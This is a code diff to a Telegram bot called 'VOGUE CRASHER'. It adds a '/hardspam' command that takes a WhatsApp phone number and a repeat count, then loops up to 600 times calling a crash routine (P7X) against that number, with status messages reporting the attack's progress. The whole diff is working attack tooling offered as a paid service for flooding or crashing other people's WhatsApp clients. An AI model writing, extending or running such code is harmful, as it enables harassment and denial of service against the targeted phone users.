@@ -2220,26 +2220,40 @@ Please verify the target input and system status before retrying.`
     }
 });
 
-bot.command('spamtest', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+bot.command('hardspam', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
-    let q = ctx.message?.text?.split(" ")[1];
+    let args = ctx.message?.text?.split(" ");
+    
+    let q = args[1];
+    
+    let executionCount =
+        parseInt(args[2]) || 1;
+    
+    if (executionCount > 30) {
+        executionCount = 30;
+    }
     
     if (!q) return ctx.reply(
         `Invalid Format
 
 Usage:
-/spamandro <target_number>
+/hardspam <target_number> <amount>
 
 Example:
-/spamandro 628xxxxxxxx`
+/hardspam 628xxxxxxxx 50`
     );
     
-    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    let target =
+        q.replace(/[^0-9]/g, "") +
+        "@s.whatsapp.net";
     
     try {
         
-        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
-            caption: `
+        const sent =
+            await ctx.replyWithPhoto(
+                thumbnailUrl,
+                {
+                    caption: `
 <pre>
 V O G U E  •  C R A S H E R
 ──────────────────────────
@@ -2247,40 +2261,104 @@ V O G U E  •  C R A S H E R
 EXECUTION STATUS
 
 Target      : ${q}
-Status      : Success
+Execution   : ${executionCount}x
+Loop        : 2
+Status      : Active
 
 ──────────────────────────
+Dispatch engine initialized.
 </pre>`,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [{
-                        text: "Check Target",
-                        url: `https://wa.me/${q}`,
-                        style: "primary"
-                    }]
-                ]
-            }
-        });
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text: "Check Target",
+                                    url: `https://wa.me/${q}`,
+                                    style: "primary"
+                                }
+                            ]
+                        ]
+                    }
+                }
+            );
         
         (async () => {
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 20; i++) {
-                try {
-                    if (!sock) {
-                        throw new Error("Socket unavailable");
+            for (let exec = 0; exec < executionCount; exec++) {
+                
+                for (let i = 0; i < 20; i++) {
+                    try {
+                     
+                        if (!sock) {
+                            throw new Error(
+                                "Socket unavailable"
+                            );
+                        }
+                        
+                        await P7X(sock, target);
+                        await sleep(1000);
+                        
+                    } catch (e) {
+                        
+                        console.log(
+                            `[WORKER ${instanceId}] Error: ${e.message}`
+                        );
+                        
+                        autoRestartOn408(e);
                     }
-                    await P7X(sock, target)
-                    await sleep(1000)
-                } catch (e) {
-                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
-                    autoRestartOn408(e);
                 }
+                
+                console.log(
+                    `[WORKER ${instanceId}] Execution ${exec + 1}/${executionCount}`
+                );
             }
             
-            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            // =========================
+            // COMPLETE OUTPUT
+            // =========================
+            
+            await ctx.telegram.editMessageCaption(
+                ctx.chat.id,
+                sent.message_id,
+                undefined,
+                
+`
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Execution   : ${executionCount}x
+Loop        : 2
+Status      : Complete
+
+──────────────────────────
+All execution completed successfully.
+</pre>`,
+                {
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text: "Check Target",
+                                    url: `https://wa.me/${q}`,
+                                    style: "success"
+                                }
+                            ]
+                        ]
+                    }
+                }
+            );
+            
+            console.log(
+                `[WORKER ${instanceId}] Done for ${q}`
+            );
             
         })();
         
@@ -2293,7 +2371,9 @@ The system was unable to execute the requested module.
 Please verify the target input and system status before retrying.`
         );
         
-        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+        console.log(
+            `[VOGUE CRASHER] Execution failed for ${q}`
+        );
     }
 });
 
